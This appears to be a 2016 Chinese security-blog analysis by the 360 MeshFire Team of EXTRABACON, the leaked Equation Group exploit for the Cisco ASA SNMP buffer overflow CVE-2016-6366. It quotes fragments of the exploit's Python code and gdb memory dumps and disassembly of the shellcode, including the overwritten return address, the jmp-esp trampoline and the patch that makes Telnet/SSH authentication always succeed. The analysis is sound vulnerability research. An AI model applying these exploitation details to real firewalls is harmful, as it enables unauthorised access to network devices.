# 揭开思科ASA防火墙网络军火的面纱（上）

阅读量 **242836**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-09-23 09:21:33

 **x**

##### 译文声明

本文是翻译文章，文章来源：安全客

译文仅供参考，具体内容表达以及含义原文为准。

**作者：360 MeshFire Team**

**稿费：700RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿**

**  
**

Shadow Brokers
曝出的EXTRABACON工具中包含思科ASA防火墙远程代码执行的0DAY漏洞，本文分析了ASA漏洞CVE-2016-6366的产生原因和利用原理，并对工具中的EXP的执行过程进行了深入分析，展示了网络设备漏洞攻防的分析和调试技巧和方法。

#

**0x01 漏洞背景**

今年8月13号，入侵美国国家安全局（NSA）的组织Shadow
Brokers在其Twitter微博上公开了大量黑客工具的链接，并将部分放在网上进行拍卖。根据Shadow
Brokers组织的描述，这些工具原属于著名的黑客团队方程式组织（Equation
Group），该组织可能与震网(stuxnet)、Regin、Flame等攻击有关，被外界怀疑受雇于美国国家安全局。

在此次公开的文件中包含了一个Cisco
ASA防火墙的远程代码执行0DAY，方程式组织将这个exploit命名为EXTRABACON。在EXTRABACON遭到曝光后，思科也立刻承认了在其多个版本的ASA产品中存在相应的漏洞，漏洞编号为CVE-2016-6366。

EXTRABACON利用的是思科ASA防火墙中处理SNMP（简单网络管理协议）代码的漏洞，本质是一个缓冲区溢出。从利用层面说来，攻击者可以向系统发送精心构造的SNMP包，一旦漏洞利用成功，攻击者则无需输入正确的登录账户和密码，就可以通过ASA的Telnet和SSH身份认证。

从公开的EXTRABACON代码来看，可对Cisco ASA
Software版本号为8.0(2)~8.4(4)的系统进行利用，但是后续网络上不断放出了针对高版本ASA系统的利用代码。

**0x02 Cisco ASA 系统分析**

在实验环境下，通过GNS网络模拟器模拟线上Cisco
ASA设备，分析中采用8.02版本的固件作为样本。使用固件分析工具binwalk提取和解压文件，发现Cisco
ASA底层实际上是一个标准的linux操作系统，这样逆向出来的汇编自然也是x86体系结构的。

通过对解压出的linux系统进行分析，可以分析出Cisco ASA防火墙系统启动加载流程如下：

在这里我们最关注的是最后三个步骤，其中lina是Cisco
ASA防火墙的主程序，lina_monitor以创建子进程的方式启动lina程序，并对lina进程进行监视和管控。rcS作为一个shell脚本控制着lina_monitor的启动方式，如传入的参数控制，基本包含了ASA所有的业务逻辑代码，在系统内存中，lina将fork多个子进程协同工作，如下图所示：

其中存在漏洞的代码运行在lina_monitor的子进程，也就是上图PID为221的lina进程中。在Cisco
ASA系统内置gdbserver，可用作对此漏洞进行远程动态调试，使用gdbserver远程调试Cisco ASA示意图如下：

**0x03 漏洞分析**

****

**1．exp分析**

此漏洞的exploit源码由Python编写，其中包含三个主要功能模块：

1）overflow漏洞利用数据生成，关键代码如下：

    
    
    head = '1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9'
    wrapper = sc.preamble_snmp
    if self.params.msg:
        wrapper += "." + sc.successmsg_snmp
        wrapper += "." + sc.launcher_snmp
        wrapper += "." + sc.postscript_snmp
        overflow = string.join([head, "95", wrapper, sc.my_ret_addr_snmp, sc.finder_snmp], ".")

其中sc是动态加载的shellcode模块，在构造overflow前exp会确认目标ASA的系统版本，并匹配对应版本的shellcode。

wrapper变量被组装了shellcode代码，整个造成溢出的数据需要有一个固定值的head，这段必须使用OID
'1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9'
，该OID属于sysDescr，在SNMP协议中是获取目标系统的一些描述信息，比如系统全名或硬件版本标识等。

字段”95”表明后面还接有95字节的数据，my_ret_addr_snmp是溢出后覆盖的函数返回地址，finder_snmp是一段跳转代码。

2）payload控制代码数据生成，关键代码如下：

    
    
    payload += sc.payload_PMCHECK_DISABLE_byte
    payload += sc.payload_AAAADMINAUTH_DISABLE_byte

这段拼接了shellcode中payload代码，控制方法为更改telnet和ssh的认证流程。

3）构造SNMP数据包，关键代码如下：

    
    
    exba_msg = SNMP(version=self.params.version,community=self.params.community,PDU=SNMPbulk(id=ASN1_INTEGER(self.params.request_id),max_repetitions=1,varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.2.1.1.1"),value=ASN1_STRING(payload)),SNMPvarbind(oid=ASN1_OID(overflow)),]))

在SNMP构造的过程中，overflow被填充到了SNMP报文的OID字段，通过控制OID输入字符长度来溢出栈。

通过构造的SNMP报文，可以得知，触发该漏洞必须满足2个约束条件：

1）攻击报文的源IP地址必须为SNMP指定的HOST地址。

2）攻击者需输入正确的SNMP的community。

若其中任何一个条件不满足，ASA将直接丢弃SNMP报文不予处理。在调试过程中，我们也确认如果不满足这两个条件中任意一个则无法跳转到漏洞代码的执行分支。

**2．协议分析**

Exp在攻击过程中会发送两个SNMP报文，第一个是查询目标ASA系统版本，其中包含了查询目标Cisco ASA设备版本号的OID，在测试环境中抓包显示如下：

查询操作成功后，ASA设备会返回一个数据包告诉对方自己的版本号，从返回的数据包，显示已成功查询到目标设备的系统版本：

紧接着exp会发送第二个报文，该报文是SNMPv2版本中定义的新分组类型get-bulk-request，用来高效率的从代理进程读取大块数据，其中包含了两个object条目，可以看到之前构造的payload数据被填充到了第一个条目的value字段中，造成溢出的overflow被填充到了第二个条目的oid字段中：

**3．代码分析**

静态分析

将Cisco ASA
8.02系统中的/asa/bin/lina文件加载到IDA中进行静态分析，通过gdb连接lina进程，通过构造特殊字符的shellcode查看实时的系统栈结构信息，查看exp执行溢出后系统栈崩溃信息，可以初步定位函数地址，不断设置断点进行跟进调试，逐渐定位到发生漏洞的函数为sub_89F4750，对其反编译后的部分代码如下：

在sub_89F4750函数中，调用了sub_90A32A0函数，这个函数的主要功能是将第二个参数指向的源地址数据copy到第一个参数指向的目的地址中，第三个参数大小影响了copy的数据长度。继续跟进到sub_90A32A0函数中查看代码：

在这部分代码中，很容易分析出for循环实际实施了内存copy操作，依次从源地址中读出4字节的数据写入到目的地址中，每一次循环将copy
64字节长度的数据，其中这个函数传入的第三个参数，也就是影响copy长度的a3变量，在循环开始时被除以4后赋值予i变量，而i变量控制循环次数，所以sub_90A32A0函数的总copy长度可能不等于第三个参数所指定值。再看一下该函数接下来的代码：

先看第一个if语句，若经过前一个阶段的for循环后，若i变量依旧不为0，则执行if内的代码块，这段代码块的作用将会从源地址中取出i*4字节长度的数据copy到目的地址中。

第二个if语句判断条件是将传入的a3参数与整数3按位与操作，其语义目的是为了过滤掉4的倍数，也就是说若a3非4的倍数将执行第二个if的代码块，这段代码的作用是从源地址中向目的地址copy参数a3与整数3按位与操作后的整型值的长度数据。

由此可见在这个函数中的三个主要流程控制的代码块中都可能发生内存copy操作，将这段IDA反编译的sub_90A32A0函数翻译为同功能的标准C语言可能更直观一些，其代码如下：

至此可以分析出sub_89F4750函数通过调用sub_90A32A0这个内存copy函数，将从上层函数传入的地址指针a6指向的源地址的数据copy到本地局部变量v32中，其copy长度也由上层函数传入的参数决定，而不是由本地局部变量v32的内存空间长度来做控制，上层传入参数很容易超出本地局部变量v32内存长度发生缓冲区溢出风险。

**动态调试**

通过Cisco ASA串口连接gdbserver进行动态调试，在发送触发漏洞的数据包前先对lina进程中copy
SNMP报文oid字段的sub_90A32A0函数调用前后下断点，以方便观察内存，如下图所示：

第二个SNMP报文成功触发了这两个断点，通过查询ESP寄存器中的值取得栈顶地址：

    
    
    (gdb) i r esp
    esp            0xab7b0fd0       0xab7b0fd0

由于遵循_stdcall约定，栈顶地址加上8字节的偏移量可以读取传入到sub_90A32A0函数的第三个参数的值：

    
    
    (gdb) x /wx 0xab7b0fd8
    0xab7b0fd8:     0x0000005f

可以看到其值的十进制正是“95”，也就是在“exp分析”一节中提到的overflow中后接shellcode的length值。将这个length带入到sub_90A32A0函数中分析出总copy的数据长度为：

总长度 = 第一阶段64字节 + 第二阶段28字节 + 第三阶段3字节 = 95字节

三个阶段copy的数据长度总和也恰好是95字节。虽然SNMP的oid字段中的length值可直接控制内存copy长度，但是并不是没有长度限制，通过不断增大oid的shellcode长度以及对应的length值。我们发现ASA系统限制了oid的最大长度为128字节，当超过这个长度ASA会丢弃这个SNMP报文不予处理。

由栈顶地址加上40字节偏移量，从上文提到的局部变量v32所指向的内存空间开始打印，如下所示的系统栈内存分布情况，其中红色部分(0x089f672c)为sub_89F4750函数的返回地址：

    
    
    (gdb) x /30wx 0xAB7B0FF8
     0xab7b0ff8:     0x00000000      0x089c8a2f      0xab7b75d8      0x00000000
     0xab7b1008:     0x00000060      0x0000005f      0x000000a1      0x00000010
     0xab7b1018:     0xab7b1048      0x089d9326      0x00000000      0x00000060
     0xab7b1028:     0xab7b1058      0x0892ee82      0x0000005e      0x00000010
     0xab7b1038:     0x00000040      0x00000010      0x00000000      0x00000004
     0xab7b1048:     0xab7b10a8      0x089f672c      0x00000002      0xab7a1400
     0xab7b1058:     0x00000004      0x000000a1      0x00000009      0xab7b75d0
     0xab7b1068:     0x00000000      0x090a1686

当sub_90A32A0函数完成copy动作后再看相同内存空间中的数据变化，其中蓝色部分(0x89b80000–
0x00000090)是写入的shellcode，红色部分(0x08d3de9b)是被覆盖的函数返回地址：

    
    
    (gdb) x /30wx 0xAB7B0FF8   
    0xab7b0ff8:     0x89b80000      0x35ad3ac2      0xa5a5a5a5      0x8904ec83
    0xab7b1008:     0xe5892404      0x3158c583      0xb3db31c0      0xbff63110
    0xab7b1018:     0xaaaaaaae      0xa5a5f781      0x8b60a5a5      0x01c82484
    0xab7b1028:     0x32040000      0xc361d0ff      0x90909090      0x90909090
    0xab7b1038:     0x90909090      0x90909090      0x90909090      0x90909090
    0xab7b1048:     0x90909090      0x08d3de9b      0x14247c8b      0xe0ff078b
    0xab7b1058:     0x00000090      0x000000a1      0x00000009      0xab7b75d0
    0xab7b1068:     0x00000000      0x090a1686

打印被覆盖的函数返回地址所指向的代码：

    
    
    (gdb) x /i 0x08d3de9b
    0x08d3de9b:jmp*%esp

可看到shellcode通过跳转到ESP的方式实现精确定位将要执行的代码。接下来打印0xab7b1050地址处的代码，也就是sub_89F4750函数栈帧弹出后，ESP所指向地址：

    
    
    (gdb) x /5i
     0xab7aeed0   0xab7b1050:  mov    0x14(%esp),%edi   0xab7b1054:  mov    (%edi),%eax   0xab7b1056:  jmp    *%eax   0xab7b1058:  nop   0xab7b1059:  add    %al,(%eax)

此段代码是将sub_89F4750函数的局部变量v32指向的内存地址读取到了EAX寄存器中，读取出EAX中的值：

    
    
    (gdb) i r eax
    eax            0xab7b75d8       -1417972264
    查看地址0xab7b75d8处的代码：
    (gdb) x /18i 0xab7b75d8
       0xab7b75d8:  mov    $0xad3ac289,%eax
       0xab7b75dd:  xor    $0xa5a5a5a5,%eax
       ……
       0xab7b7600:  pusha  
       0xab7b7601:  mov    0x1c8(%esp),%eax
       0xab7b7608:  add    $0x32,%al
       0xab7b760a:  call   *%eax
       0xab7b760c:  popa   
       0xab7b760d:  ret

我们继续在0xab7b760a和0xab7b760d处下两个断点，可以读取到shellcode的下一处跳转地址和整个shellcode执行结束后的返回地址，其中先在第一个中断处读取到EAX的值，并查看其跳转处的代码：

    
    
    (gdb) i r eax
    eax            0xab7b1462       -1417997214
    (gdb) x /23i 0xab7b1462
       0xab7b1462:  mov    $0xa5a5a5a5,%edi
       0xab7b1467:  mov    $0xa5a5a5d8,%eax
       ……
       0xab7b1481:  xor    %edi,%edx
       0xab7b1483:  int    $0x80  ;mprotect()
       0xab7b1485:  jmp    0xab7b149b
       0xab7b1487:  mov    $0x906ed20,%edi
       0xab7b148c:  xor    %ecx,%ecx
       0xab7b148e:  mov    $0x4,%cl
       0xab7b1490:  cld    
       0xab7b1491:  rep movsb %ds:(%esi),%es:(%edi)  ;copy patch bytes to offset
       0xab7b1493:  jmp    0xab7b14a4  ;go to payload2
       0xab7b1498:  pop    %esi
       0xab7b1499:  jmp    0xab7b1487
       0xab7b149b:  call   0xab7b1498
       0xab7b14a0:  xor    %eax,%eax
       0xab7b14a2:  inc    %eax
       0xab7b14a3:  ret

发现这段地址存储的代码正是之前构造的payload，该部分payload修改了telnet和ssh的认证流程，使其身份认证过程失效。这段代码有两个主要的操作：

1）在0xab7b1483处通过linux系统调用mprotect()赋予相关内存页面可读/可写/可执行权限，然后直接jmp 0xab7b149b。

2）在0xab7b149b处，代码将下一个指令的地址压入到栈中，然后跳转到0xab7b1498，然后pop出当前栈顶数据，此时正好将地址0xab7b14a0写到了ESI中，接着通过rep指令将最后三行代码写入到身份认证函数的起始地址0x906ed20处，这样认证函数无论接收到了怎样的用户名和密码参数，都直接返回true，从而绕过系统的身份认证。可以查看溢出后错误的随机用户名依旧保存在登录系统中，如下图：

继续执行continue命令，程序停在了0xab7b760d处，通过查看ESP指向的栈顶数据来确定ret的地址：

    
    
    (gdb) i r esp
    esp            0xab7b104c       0xab7b104c
    (gdb) x /wx 0xab7b104c
    0xab7b104c:     0x089f672c
    (gdb)

shellcode执行完成后跳转的地址为0x089f672c，这正是sub_89F4750函数执行完成后的正常返回地址，见下图，从而避免了原系统栈被破坏而导致系统崩溃，至此动态分析过程全部结束。

在cisco ASA系统对SNMP报文OID长度做了限制，只能有128字节，
OID固定的头部标识占去了17字节，在栈中v32指向的内存起始地址距函数返回地址的偏移量为82字节，由此可计算超出函数返回地址的溢出长度为：OID总长度 –
OID head – 偏移量 = 128 – 17 – 82 = 29字节，分析来看通过jmp esp的方式最多只能执行29字节的代码。

  

**0x04总结**

针对此次ASA漏洞及exp的分析和重现，我们发现该漏洞溢出的长度并不大，远远不够载入一次完整攻击所有shellcode，
因此exp构造的shellcode分布在内存的多个区域，通过多次跳转来完成完整的exploit。此外，虽然漏洞触发后可获取ASA设备底层的系统权限，一般会采用反弹shell的方式来进行利用，但该exp并没有直接获取shell，而是通过更改lina程序的执行流程来突破了telnet和ssh的身份认证。这样做一方面隐蔽性非常高，系统几乎难以发现入侵的痕迹，同时还可以充分发挥ASA设备强大网络操控功能，例如监听流量，配置隧道来进行隐秘的监听，而底层linux系统编译进来系统命令很少，利用的功能相对有限。同时该exp实现了ASA系统多版本的适配，确实可以反映出该漏洞利用程序的开发有着相对较高工程化的实现。

本文翻译自安全客 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **360 MeshFire Team** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/84614](/post/id/84614)

安全客 - 有思想的安全新媒体

本文转载自: [安全客]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __5赞

 __收藏

![](https://p2.ssl.qhimg.com/t01b22d45fef232c21b.png) 360 MeshFire Team

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

